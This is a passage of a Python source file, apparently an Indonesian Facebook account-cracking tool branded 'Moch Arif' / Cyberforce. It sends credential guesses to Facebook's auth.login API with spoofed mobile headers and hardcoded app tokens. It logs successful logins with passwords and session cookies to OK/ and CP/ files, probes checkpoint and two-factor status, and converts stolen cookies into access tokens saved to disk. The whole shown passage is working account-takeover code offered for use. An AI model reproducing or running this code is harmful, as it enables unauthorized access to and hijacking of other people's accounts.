                        "login_location_accuracy_m": "1.0",
                        "meta_inf_fbmeta": "",
                        "advertiser_id": str(uuid.uuid4()),
                        "encrypted_msisdn": "",
                        "currently_logged_in_userid": "0",
                        "locale": "en_US",
                        "client_country_code": "US",
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    }
                    head = {
                        "content-type": "application/x-www-form-urlencoded",
                        "x-fb-sim-hni": str(random.randint(2e4, 4e4)),
                        "x-fb-connection-type": "unknown",
                        "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        "user-agent": self.ua,
                        "x-fb-net-hni": str(random.randint(2e4, 4e4)),
                        "x-fb-connection-bandwidth": str(random.randint(2e7, 3e7)),
                        "x-fb-connection-quality": "EXCELLENT",
                        "x-fb-friendly-name": "authenticate",
                        "accept-encoding": "gzip, deflate",
                        "x-fb-http-engine": "Liger",
                    }
                    head = {
                        "Host": "free.prod.facebook.com",
                        "cache-control": "max-age=0",
                        "upgrade-insecure-requests": "1",
                        "origin": "https://free.prod.facebook.com",
                        "content-type": "application/x-www-form-urlencoded",
                        "user-agent": self.ua,
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "x-requested-with": "mark.via.gp",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-user": "?1",
                        "sec-fetch-dest": "document",
                        "referer": "https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                        "accept-encoding": "gzip, deflate br",
                        "accept-language": "id-ID;q=0.6,en;q=0.7,en-US;q=0.8,en;q=0.9",
                        "view-width": "980",
                        "connection": "Keep-Alive",
                        "cookie": (";").join(
                            [
                                "%s=%s" % (key, value)
                                for key, value in r.cookies.get_dict().items()
                            ]
                        ),
                    }
                    po = r.post(
                        "https://b-api.facebook.com/method/auth.login",
                        data=data,
                        headers=head,
                        allow_redirects=False,
                    ).text
                    posz = json.loads(po)
                    if "session_key" in posz:
                        self.success += 1
                        try:
                            self.__cooz = ";".join(
                                i["name"] + "=" + i["value"]
                                for i in posz["session_cookies"]
                            )
                        except:
                            pass
                        Suck = Mek("")
                        Okeh = Suck.add("[italic green] Moch Arif > OK")
                        Okeh.add("[italic white] ID [italic green]: {}".format(user))
                        Okeh.add("[italic white] Sandi [italic green]: {}".format(pw))
                        Okeh.add(
                            "[italic white] Tahun Akun [italic green]: {}".format(
                                self.tahun(user)
                            )
                        )
                        Okeh = Suck.add(
                            "[italic white] Cookies [italic green]: {}".format(
                                self.__cooz
                            )
                        )
                        Okeh.add(
                            "[italic white] User Agent [italic green]: {}".format(
                                self.ua
                            )
                        )
                        zeeprint(Suck)
                        with open("OK/" + okc, "a") as self.simpan:
                            self.simpan.write(
                                user + "|" + pw + "|" + self.__cooz + "\n"
                            )
                        break

                    elif "www.facebook.com" in posz["error_msg"]:
                        Suck = Mek("")
                        Cepeh = Suck.add("[italic red] Moch Arif > CP")
                        Cepeh.add("[italic white] ID [italic red]: {}".format(user))
                        Cepeh.add("[italic white] Sandi [italic red]: {}".format(pw))
                        Cepeh.add(
                            "[italic white] Tahun Akun [italic red]: {}".format(
                                self.tahun(user)
                            )
                        )
                        Suck.add(
                            "[italic white] User Agent [italic red]: {}".format(self.ua)
                        )
                        zeeprint(Suck)
                        self.chekpoint += 1
                        with open("CP/" + cpc, "a") as self.simpan:
                            self.simpan.write(user + "|" + pw + "\n")
                        break
                    else:
                        continue
        except (KeyboardInterrupt, Exception) as e:
            time.sleep(
                31
            )  # ;Console().print(f'\n[italic red]{str(e).title()}[italic white]')
        self.looping += 1

    def Detecktor(self):
        _denventa_zee_()
        self.dirs = os.listdir("CP")
        for self.file in self.dirs:
            Console().print(
                "[italic white][[italic purple]#[italic white]][italic yellow] {}[italic white]".format(
                    self.file
                )
            )
        try:
            self.Ceck_Ops()
        except IOError as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()

    def Ceck_Ops(self):
        self.cpz = Console().input(
            "\n[italic white][[italic purple]#[italic white]] Choose [italic green]: "
        )
        try:
            self.fileX = open("CP/" + self.cpz, "r").readlines()
        except IOError as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()
        Console().print(
            "[italic white][[italic purple]#[italic white]] Hasil Tapyes Otomatis Tersimpan Di /sdcard/CP/{}\n".format(
                tapyes
            )
        )
        Console().print(
            "[italic white][[italic purple]#[italic white]] Total Akun [italic yellow]: {}[italic white]\n".format(
                str(len(self.fileX))
            )
        )
        self.nomor = 0
        for self.developers in self.fileX:
            self.akun = self.developers.replace("\n", "")
            self.ngecek = self.akun.split("|")
            self.nomor += 1
            Console().print(
                "[italic white][[italic yellow]{}[italic white]] login akun [italic yellow]: {}[italic white]".format(
                    (str(self.nomor)), self.akun
                )
            )
            time.sleep(2)
            try:
                self.Jalan(self.ngecek[0].replace("", ""), self.ngecek[1])
            except requests.exceptions.ConnectionError:
                continue
        Console().print(
            "\n[italic white][[italic yellow]#[italic white]] Selesaii, Cek Opsiii... [italic white]"
        )

    def Jalan(self, user, pw):
        data, data2 = {}, {}
        with requests.Session() as r:
            self.ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"
            soup = par(
                r.get(
                    "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
                ).text,
                "html.parser",
            )
            link = soup.find("form", {"method": "post"})
            for x in soup("input"):
                data.update({x.get("name"): x.get("value")})
            data.update({"email": user, "pass": pw})
            urlPost = r.post("https://m.facebook.com" + link.get("action"), data=data)
            #            urlPost=r.post('https://m.facebook.com'+link.get("action"), data=data, headers={'User-Agent':self.ua})
            response = par(urlPost.text, "html.parser")
            self.nomer = 0
            if "Temukan Akun Anda" in re.findall(
                "\<title>(.*?)<\/title>", str(urlPost.text)
            ):
                pass
            elif "c_user" in r.cookies.get_dict():
                if "Akun Anda Dikunci" in urlPost.text:
                    Ops = Mek("")
                    Opss = Ops.add("[italic red] Moch Arif > CP")
                    Opss.add("[italic red]{}[italic white]".format(user))
                    Opss.add("[italic red]{}[italic white]".format(pw))
                    Opss.add(
                        "[italic white] Tahun Akun [italic yellow]: {}".format(
                            self.tahun(user)
                        )
                    )
                    Opss = Ops.add("[italic purple]{}[italic white]".format(self.ua))
                    Opss.add("[italic yellow] Sorry, Akun Anda Terkunci")
                    prints(Ops)
                else:
                    __cooz = (";").join(
                        [
                            "%s=%s" % (key, value)
                            for key, value in r.cookies.get_dict().items()
                        ]
                    )
                    Ops = Mek("")
                    Opss = Ops.add("[italic green]{}[italic white]".format(user))
                    Opss.add("[italic green]{}[italic white]".format(pw)).add(
                        "[italic green]{}[italic white]".format(__cooz)
                    ).add(
                        "[italic white] Tahun Akun [italic green]: {}".format(
                            self.tahun(user)
                        )
                    )
                    Opss.add("[italic purple]{}[italic white]".format(self.ua))
                    Ops.add("[italic green] Selamat, Akun Tapyes")
                    prints(Ops)
                    with open("CP/" + tapyes, "a") as self.simpan:
                        self.simpan.write(user + "|" + pw + "|" + __cooz + "\n")
            elif "checkpoint" in r.cookies.get_dict():
                title = re.findall("\<title>(.*?)<\/title>", str(response))
                link2 = response.find("form", {"method": "post"})
                listInput = [
                    "fb_dtsg",
                    "jazoest",
                    "checkpoint_data",
                    "submit[Continue]",
                    "nh",
                ]
                for x in response("input"):
                    if x.get("name") in listInput:
                        data2.update({x.get("name"): x.get("value")})
                an = r.post("https://m.facebook.com" + link2.get("action"), data=data2)
                response2 = par(an.text, "html.parser")
                cek = [cek.text for cek in response2.find_all("option")]
                if len(cek) == 0:
                    if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                        pass
                    elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall(
                        "\<title>(.*?)<\/title>", str(response)
                    ):
                        Ops = Mek("")
                        Opss = Ops.add("[italic red] Moch Arif > CP")
                        Opss.add("[italic red]{}[italic white]".format(user))
                        Opss.add("[italic red]{}[italic white]".format(pw))
                        Opss.add(
                            "[italic white] Tahun Akun [italic yellow]: {}".format(
                                self.tahun(user)
                            )
                        )
                        Opss = Ops.add(
                            "[italic purple]{}[italic white]".format(self.ua)
                        )
                        Opss.add("[italic yellow] Sorry, Akun Terpasang A2f")
                        prints(Ops)
                    else:
                        Ops = Mek("")
                        Opss = Ops.add("[italic red] Moch Arif > CP")
                        Opss.add("[italic red]{}[italic white]".format(user))
                        Opss.add("[italic red]{}[italic white]".format(pw))
                        Opss.add(
                            "[italic white] Tahun Akun [italic yellow]: {}".format(
                                self.tahun(user)
                            )
                        )
                        Opss = Ops.add(
                            "[italic purple]{}[italic white]".format(self.ua)
                        )
                        Opss.add(
                            "[italic yellow] Sorry, Login Gagal, Kemungkinan Kata Sandi Telah Di Ubah"
                        )
                        prints(Ops)
                else:
                    if "c_user" in r.cookies.get_dict():
                        __cooz = (";").join(
                            [
                                "%s=%s" % (key, value)
                                for key, value in r.cookies.get_dict().items()
                            ]
                        )
                        Ops = Mek("")
                        Opss = Ops.add("[italic green] Moch Arif > OK")
                        Opss.add("[italic white] ID [italic green]: {}".format(user))
                        Opss.add("[italic white] Sandi [italic green]: {}".format(pw))
                        Opss.add(
                            "[italic white] Tahun Akun [italic green]: {}".format(
                                self.tahun(user)
                            )
                        )
                        Opss = Ops.add(
                            "[italic white] Cookies [italic green]: {}".format(__cooz)
                        )
                        Opss.add(
                            "[italic white] User Agent [italic green]: {}".format(
                                self.ua
                            )
                        ).add("[italic green] Selamat, Akun Tidak Checkpoint")
                        prints(Ops)
                        with open("CP/" + tapyes, "a") as self.simpan:
                            self.simpan.write(user + "|" + pw + "|" + __cooz + "\n")
                for opsi in range(len(cek)):
                    self.nomer += 1
                    Ops = Mek("")
                    Opss = Ops.add("[italic red] Moch Arif > CP")
                    Opss.add("[italic red]{}[italic white]".format(user))
                    Opss.add("[italic red]{}[italic white]".format(pw))
                    Opss.add(
                        "[italic white] Tahun Akun [italic yellow]: {}".format(
                            self.tahun(user)
                        )
                    )
                    Opss = Ops.add("[italic purple]{}[italic white]".format(self.ua))
                    Opss.add(
                        "[italic white][[italic yellow]{}[italic white]][italic yellow] {}".format(
                            str(self.nomer), cek[opsi]
                        )
                    )
                    prints(Ops)
            elif "login_error" in str(response):
                oh = run.find("div", {"id": "login_error"}).find("div").text
                Console().print("[italic red]{}".format(oh))
            else:
                Ops = Mek("")
                Opss = Ops.add("[italic red] Moch Arif > CP")
                Opss.add("[italic red]{}[italic white]".format(user))
                Opss.add("[italic red]{}[italic white]".format(pw))
                Opss.add(
                    "[italic white] Tahun Akun [italic yellow]: {}".format(
                        self.tahun(user)
                    )
                )
                Opss = Ops.add("[italic purple]{}[italic white]".format(self.ua))
                Opss.add(
                    "[italic yellow] Sorry, Login Gagal, Kemungkinan Kata Sandi Telah Di Ubah"
                )
                prints(Ops)

    def Detecktor2(self):
        _denventa_zee_()
        self.dirs = os.listdir("OK")
        for self.file in self.dirs:
            Console().print(
                "[italic white][[italic purple]#[italic white]][italic green] {}[italic white]".format(
                    self.file
                )
            )
        try:
            self.Ceck_Ops2()
        except IOError as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()

    def Ceck_Ops2(self):
        self.okz = Console().input(
            "\n[italic white][[italic purple]#[italic white]] Choose [italic green]: "
        )
        try:
            self.fileX = open("OK/" + self.okz, "r").readlines()
        except IOError as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()
        Console().print(
            "[italic white][[italic purple]#[italic white]] Hasil Kebuka Otomatis Tersimpan Di /sdcard/OK/{}\n".format(
                tapyes
            )
        )
        Console().print(
            "[italic white][[italic purple]#[italic white]] Total Akun [italic green]: {}[italic white]\n".format(
                str(len(self.fileX))
            )
        )
        self.nomor = 0
        for self.developers in self.fileX:
            self.akun = self.developers.replace("\n", "")
            self.ngecek = self.akun.split("|")
            self.nomor += 1
            Console().print(
                "[italic white][[italic green]{}[italic white]] login akun [italic green]: {}[italic white]".format(
                    (str(self.nomor)), self.akun
                )
            )
            time.sleep(2)
            try:
                self.Jalan2(self.ngecek[0].replace("", ""), self.ngecek[1])
            except requests.exceptions.ConnectionError:
                continue
        Console().print(
            "\n[italic white][[italic green]#[italic white]] Selesaii, Cek Opsiii... [italic white]"
        )

    def Jalan2(self, user, pw):
        data, data2 = {}, {}
        with requests.Session() as r:
            self.ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"
            soup = par(
                r.get(
                    "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
                ).text,
                "html.parser",
            )
            link = soup.find("form", {"method": "post"})
            for x in soup("input"):
                data.update({x.get("name"): x.get("value")})
            data.update({"email": user, "pass": pw})
            urlPost = r.post("https://m.facebook.com" + link.get("action"), data=data)
            #            urlPost=r.post('https://m.facebook.com'+link.get("action"), data=data, headers={'User-Agent':self.ua})
            response = par(urlPost.text, "html.parser")
            self.nomer = 0
            if "Temukan Akun Anda" in re.findall(
                "\<title>(.*?)<\/title>", str(urlPost.text)
            ):
                pass
            elif "c_user" in r.cookies.get_dict():
                if "Akun Anda Dikunci" in urlPost.text:
                    Ops = Mek("")
                    Opss = Ops.add("[italic red] Moch Arif > CP")
                    Opss.add("[italic red]{}[italic white]".format(user))
                    Opss.add("[italic red]{}[italic white]".format(pw))
                    Opss.add(
                        "[italic white] Tahun Akun [italic yellow]: {}".format(
                            self.tahun(user)
                        )
                    )
                    Opss = Ops.add("[italic purple]{}[italic white]".format(self.ua))
                    Opss.add("[italic yellow] Sorry, Akun Anda Terkunci")
                    prints(Ops)
                else:
                    __cooz = (";").join(
                        [
                            "%s=%s" % (key, value)
                            for key, value in r.cookies.get_dict().items()
                        ]
                    )
                    Ops = Mek("")
                    Opss = Ops.add("[italic green] Moch Arif > OK")
                    Opss.add("[italic white] ID [italic green]: {}".format(user))
                    Opss.add("[italic white] Sandi [italic green]: {}".format(pw))
                    Opss.add(
                        "[italic white] Tahun Akun [italic green]: {}".format(
                            self.tahun(user)
                        )
                    )
                    Opss = Ops.add(
                        "[italic white] Cookies [italic green]: {}".format(__cooz)
                    )
                    Opss.add(
                        "[italic white] User Agent [italic green]: {}".format(self.ua)
                    ).add("[italic green] Selamat, Akun Bisa Di Login")
                    prints(Ops)
                    with open("OK/" + tapyes, "a") as self.simpan:
                        self.simpan.write(user + "|" + pw + "|" + __cooz + "\n")
            elif "checkpoint" in r.cookies.get_dict():
                title = re.findall("\<title>(.*?)<\/title>", str(response))
                link2 = response.find("form", {"method": "post"})
                listInput = [
                    "fb_dtsg",
                    "jazoest",
                    "checkpoint_data",
                    "submit[Continue]",
                    "nh",
                ]
                for x in response("input"):
                    if x.get("name") in listInput:
                        data2.update({x.get("name"): x.get("value")})
                an = r.post("https://m.facebook.com" + link2.get("action"), data=data2)
                response2 = par(an.text, "html.parser")
                cek = [cek.text for cek in response2.find_all("option")]
                if len(cek) == 0:
                    if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                        pass
                    elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall(
                        "\<title>(.*?)<\/title>", str(response)
                    ):
                        Ops = Mek("")
                        Opss = Ops.add("[italic red] Moch Arif > CP")
                        Opss.add("[italic red]{}[italic white]".format(user))
                        Opss.add("[italic red]{}[italic white]".format(pw))
                        Opss.add(
                            "[italic white] Tahun Akun [italic yellow]: {}".format(
                                self.tahun(user)
                            )
                        )
                        Opss = Ops.add(
                            "[italic purple]{}[italic white]".format(self.ua)
                        )
                        Opss.add("[italic yellow] Sorry, Akun Terpasang A2f")
                        prints(Ops)
                    else:
                        Ops = Mek("")
                        Opss = Ops.add("[italic red] Moch Arif > CP")
                        Opss.add("[italic red]{}[italic white]".format(user))
                        Opss.add("[italic red]{}[italic white]".format(pw))
                        Opss.add(
                            "[italic white] Tahun Akun [italic yellow]: {}".format(
                                self.tahun(user)
                            )
                        )
                        Opss = Ops.add(
                            "[italic purple]{}[italic white]".format(self.ua)
                        )
                        Opss.add(
                            "[italic yellow] Sorry, Login Gagal, Kemungkinan Kata Sandi Telah Di Ubah"
                        )
                        prints(Ops)
                else:
                    if "c_user" in r.cookies.get_dict():
                        __cooz = (";").join(
                            [
                                "%s=%s" % (key, value)
                                for key, value in r.cookies.get_dict().items()
                            ]
                        )
                        Ops = Mek("")
                        Opss = Ops.add("[italic green] Moch Arif > OK")
                        Opss.add("[italic white] ID [italic green]: {}".format(user))
                        Opss.add("[italic white] Sandi [italic green]: {}".format(pw))
                        Opss.add(
                            "[italic white] Tahun Akun [italic green]: {}".format(
                                self.tahun(user)
                            )
                        )
                        Opss = Ops.add(
                            "[italic white] Cookies [italic green]: {}".format(__cooz)
                        )
                        Opss.add(
                            "[italic white] User Agent [italic green]: {}".format(
                                self.ua
                            )
                        ).add("[italic green] Selamat, Akun Bisa Di Login")
                        prints(Ops)
                        with open("OK/" + tapyes, "a") as self.simpan:
                            self.simpan.write(user + "|" + pw + "|" + __cooz + "\n")
                for opsi in range(len(cek)):
                    self.nomer += 1
                    Ops = Mek("")
                    Opss = Ops.add("[italic red] Moch Arif > CP")
                    Opss.add("[italic red]{}[italic white]".format(user))
                    Opss.add("[italic red]{}[italic white]".format(pw))
                    Opss.add(
                        "[italic white] Tahun Akun [italic yellow]: {}".format(
                            self.tahun(user)
                        )
                    )
                    Opss = Ops.add("[italic purple]{}[italic white]".format(self.ua))
                    Opss.add(
                        "[italic white][[italic yellow]{}[italic white]][italic yellow] {}".format(
                            str(self.nomer), cek[opsi]
                        )
                    )
                    prints(Ops)
            elif "login_error" in str(response):
                oh = run.find("div", {"id": "login_error"}).find("div").text
                Console().print("[italic red]{}".format(oh))
            else:
                Ops = Mek("")
                Opss = Ops.add("[italic red] Moch Arif > CP")
                Opss.add("[italic red]{}[italic white]".format(user))
                Opss.add("[italic red]{}[italic white]".format(pw))
                Opss.add(
                    "[italic white] Tahun Akun [italic yellow]: {}".format(
                        self.tahun(user)
                    )
                )
                Opss = Ops.add("[italic purple]{}[italic white]".format(self.ua))
                Opss.add(
                    "[italic yellow] Sorry, Login Gagal, Kemungkinan Kata Sandi Telah Di Ubah"
                )
                prints(Ops)

    def Cokies(self, cok):
        try:
            with requests.Session() as r:
                data = {
                    "access_token": "1348564698517390|007c0a9101b9e1c8ffab727666805038",
                    "scope": "",
                }
                self.req = r.post(
                    "https://graph.facebook.com/v16.0/device/login/", data=data
                ).json()
                self.cd = self.req["code"]
                self.ucd = self.req["user_code"]
                self.url = (
                    "https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038"
                    % (self.cd)
                )
                self.req = par(
                    r.get(
                        "https://mbasic.facebook.com/device", cookies={"cookie": cok}
                    ).content,
                    "html.parser",
                )
                self.raq = self.req.find("form", {"method": "post"})
                dat = {
                    "jazoest": re.search(
                        'name="jazoest" type="hidden" value="(.*?)"', str(self.raq)
                    ).group(1),
                    "fb_dtsg": re.search(
                        'name="fb_dtsg" type="hidden" value="(.*?)"', str(self.req)
                    ).group(1),
                    "qr": "0",
                    "user_code": self.ucd,
                }
                self.rel = "https://mbasic.facebook.com" + self.raq["action"]
                self.pos = par(
                    r.post(self.rel, data=dat, cookies={"cookie": cok}).content,
                    "html.parser",
                )
                dat = {}
                self.raq = self.pos.find("form", {"method": "post"})
                for x in self.raq("input", {"value": True}):
                    try:
                        if x["name"] == "__CANCEL__":
                            pass
                        else:
                            dat.update({x["name"]: x["value"]})
                    except (KeyboardInterrupt, Exception) as e:
                        pass
                self.rel = "https://mbasic.facebook.com" + self.raq["action"]
                self.pos = par(
                    r.post(self.rel, data=dat, cookies={"cookie": cok}).content,
                    "html.parser",
                )
                self.req = r.get(self.url, cookies={"cookie": cok}).json()
                tok = self.req["access_token"]
                toii = open(".token.txt", "w").write(tok)
                koi = open(".cookie.txt", "w").write(cok)
        except (KeyboardInterrupt, Exception) as e:
            Console().print(f"[Error] {str(e).capitalize()}!")
            _zee_denventa()


def berjalan(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


if __name__ == "__main__":
    try:
        os.mkdir("OK")
    except:
        pass
    try:
        os.mkdir("CP")
    except:
        pass
    try:
        os.mkdir("data")
    except:
        pass
    clear_terminal()
    try:
        Cyberforce()
    except (KeyboardInterrupt, Exception) as e:
        _zee_denventa(f"[Error] {str(e).capitalize()}!")
